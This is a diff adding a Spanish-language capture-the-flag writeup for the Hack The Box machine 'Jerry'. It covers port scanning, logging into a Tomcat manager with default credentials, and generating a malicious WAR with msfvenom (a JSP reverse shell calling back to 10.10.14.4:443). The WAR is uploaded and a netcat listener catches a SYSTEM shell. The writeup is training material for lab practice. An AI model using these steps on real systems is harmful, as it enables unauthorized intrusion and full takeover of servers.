@@ -1,0 +1,160 @@
+<p><img src="/assets/images/htb-writeup-jerry/Jerry.png" alt="Jerry.png" /></p>
+
+<p>Certificaciones a aplicar: eJPT</p>
+
+<p>Dificultad: Fácil</p>
+
+<p>Habilidades:</p>
+
+<ul>
+  <li>Information Leakage</li>
+  <li>Abusing Tomcat [Intrusion &amp; Privilege Escalation]</li>
+</ul>
+
+<h1 id="ip-de-la-maquina">IP de la Maquina</h1>
+
+<p>10.10.10.95</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<p>Identificando el sistema operativo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whichSystem.py 10.10.10.95
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-37-24.png" alt="Hackforce-2022-12-18-18-37-24.png" /></p>
+
+<p>Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.95 <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-48-57.png" alt="Hackforce-2022-12-18-18-48-57.png" /></p>
+
+<p>Función extractPorts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-49-49.png" alt="Hackforce-2022-12-18-18-49-49.png" /></p>
+
+<h1 id="análisis-de-vulnerabilidades">Análisis de Vulnerabilidades</h1>
+
+<p>Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> 10.10.10.95 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-00-49.png" alt="Hackforce-2022-12-18-19-00-49.png" /></p>
+
+<p>Vemos que estamos ante un apache tomcat y nos muestra la version.</p>
+
+<p>Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-11-18-07-31.png" alt="Hackforce-2022-12-11-18-07-31.png" /></p>
+
+<p>De esta manera vemos que estamos ante un Ubuntu Bionic.</p>
+
+<p>Vamos a verificar con whatweb  y a ver que nos reporta la herramienta.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.95:8080
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-03-36.png" alt="Hackforce-2022-12-18-19-03-36.png" /></p>
+
+<p>Vemos poco solo que estamos ante un Tomcat de version 7.0.88.</p>
+
+<p>con whatweb y el parámetro -v nos mostrara un poco mas de información y de manera mas ordenada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.95:8080 <span class="nt">-v</span>
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-14-20.png" alt="Hackforce-2022-12-18-19-14-20.png" /></p>
+
+<p>Igual no logramos ver nada en concreto a si que vamos a proceder a inspeccionar la web.</p>
+
+<p>Vemos que es un panel de tomcat.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-40-55.png" alt="Hackforce-2022-12-18-19-40-55.png" /></p>
+
+<p>Vamos a probar una ruta que suele venir siempre cuando hay un tomcat.</p>
+
+<p>10.10.10.95:8080/manager/html.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-43-27.png" alt="Hackforce-2022-12-18-19-43-27.png" /></p>
+
+<p>Vemos que nos solicita credenciales para acceder.</p>
+
+<p>Como no disponemos de credenciales, lo habitual es probar las que vienen por default en la aplicación.</p>
+
+<p>Si ingresamos las credenciales que vienen por default nos mostrara lo siguiente.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-47-53.png" alt="Hackforce-2022-12-18-19-47-53.png" /></p>
+
+<p>Si leemos detenidamente lo que nos dice, veremos que pone como se deberia configurar las credenciales de acceso y vemos 2 campos interesantes, username y password.</p>
+
+<p>Colocamos las credenciales que encontramos al ver el archivo anterior y probamos.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-51-20.png" alt="Hackforce-2022-12-18-19-51-20.png" /></p>
+
+<p>Como vemos hemos podido ingresar, ahora observaremos detenidamente que podemos hacer.</p>
+
+<p>Vemos que podemos subir nuestro propio archivo war.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-53-30.png" alt="Hackforce-2022-12-18-19-53-30.png" /></p>
+
+<p>Lo que trataremos de hacer sera subir un war malicioso para que lo podamos ejecutar desde el panel de aplicaciones.</p>
+
+<h1 id="explotación">Explotación</h1>
+
+<p>Vamos a generar un war malicioso con msfvenom.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-l</span> payloads | <span class="nb">grep </span>java
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-04-18.png" alt="Hackforce-2022-12-18-20-04-18.png" /></p>
+
+<p>Con este comando listamos los payloads disponibles en java, porque este nos permitirá generar el war malicioso. En este caso el que nos interesa es el que pone java/jsp_shell_reverse_tcp para entablarnos una conexión inversa en la maquina victima.</p>
+
+<p>Luego nos dirigimos al directorio content y creamos el payload con msfvenom.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.4 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="nt">-o</span> shell.war
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-16-25.png" alt="Hackforce-2022-12-18-20-16-25.png" /></p>
+
+<p>Listo ahi tendríamos nuestro war malicioso creado.</p>
+
+<p>Ahora nos movemos el war malicioso a nuestro directorio de descargas y lo subimos a tomcat.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-20-37.png" alt="Hackforce-2022-12-18-20-20-37.png" /></p>
+
+<p>Así se miraría nuestro war malicioso en el servidor.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-22-55.png" alt="Hackforce-2022-12-18-20-22-55.png" /></p>
+
+<p>Ahora nos ponemos en escucha con netcat y ejecutamos el war malicioso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-25-47.png" alt="Hackforce-2022-12-18-20-25-47.png" /></p>
+
+<p>Con esto deberíamos ganar acceso a la maquina y estaríamos como nt authority system.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-29-47.png" alt="Hackforce-2022-12-18-20-29-47.png" /></p>
+
+<p>Procedemos a buscar las flags y listo con esto terminaríamos la maquina.</p>
+
+<p><img src="/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-41-30.png" alt="Hackforce-2022-12-18-20-41-30.png" /></p>
+
+<p>Ahi podemos visualizar las flags, que como vemos nos dan la de user y root.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>En este caso la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa por lo que no hay que elevar privilegios.</p>
+
+<p>Listo con esto tendríamos hecha la maquina por completo, happy hacking.</p>
+
+<p>Les dejo la resolución de la misma por s4vitar <a href="https://www.youtube.com/watch?v=bB-M5vPegMk">Ver video</a></p>
